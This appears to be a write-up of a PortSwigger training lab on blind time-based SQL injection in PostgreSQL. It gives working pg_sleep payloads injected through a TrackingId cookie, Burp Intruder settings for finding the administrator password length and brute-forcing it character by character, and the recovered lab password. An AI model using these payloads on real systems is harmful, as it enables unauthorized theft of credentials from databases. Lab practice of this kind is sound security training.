## Lab Description:

<img width="862" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/b593862c-97bc-47ac-8b78-c7ebbe7b9612">

## Solution:



```SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''```

Confirm that blind sql injection works -
Modify the cookie value

Since it is a POSTgreSQL , we use the following syntax

<img width="618" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/28baf726-8559-4775-bc2b-e33e502eda81">

```TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--```

We get response after 10 sec delay, which confirms the blind SQL injection vulnerability

<img width="1201" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/40887c22-2b4f-40a6-b8a3-424019a8bd06">


Change the boolean condition (1=2) to verify it

```TrackingId=x';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--```

We get a response immediately which means the condition failed (1=2)

<img width="1203" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/0afdfc7e-fcc7-45ed-aaa5-f767da32a4da">

Verify administrator user exists -

```TrackingId=x';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--```

It takes 10 sec to respond which means there is indeed a user called administrator

<img width="1206" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/118aee65-2d2a-4a31-9ddd-2be53dd4accf">

Find the length of admin's password -
To determine how many characters are in the password of the administrator user. To do this, change the value to:

The below payload checks if the length is > 1.

```';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--```


<img width="1181" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/787cb2ff-f4c4-42c8-8b8b-48d91ae15b6a">


It takes 10 sec delay to respond which means it is > 1 character.

Automate this process,

Send the req to intruder
Add length of password part as payload (>1)
Payload type - Sniper
Payload - Numbers (1 to 50 with step 1)
Add an extra column called Response Received to show the response time of each request.

At a payload 20 , the delay of response does not happen, means the length of password is 20 characters

<img width="1408" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/4634201d-224e-4399-b571-bf1c7cbe6dd3">

<img width="1201" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/ace58934-05c7-4944-a1ca-672494e5de4c">

Bruteforce the admin's password -
To bruteforce the password, we use a payload where we take first letter of the password and try to match it with all alphabets and numbers. If it matches then we get a 10 sec delay.

```TrackingId=x'%3BSELECT+CASE+WHEN (username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--```

Automate this

Add the part which replaces the first character (
,1) as payload 1.
Add the character to be matched against ('a') as payload 2.
Attack type - Cluster Bomb
Payload 1 - Numbers (1 to20 with step 1)
Payload 2 - Bruteforcer (min & max length as 1)
Once we get the result, we can segregate the result and get the password like before, since we can't arrange both response received and payload1 together.

So,

Highlight the requests which has 10 sec delay.

<img width="935" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/53e2e754-9aa5-466e-b7e0-69aec04329db">

We get the password of admin as - 4tl4obimn56dxoo3xqb8



<img width="1426" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/377eb599-7dec-4c5d-81e6-3cfeec262082">
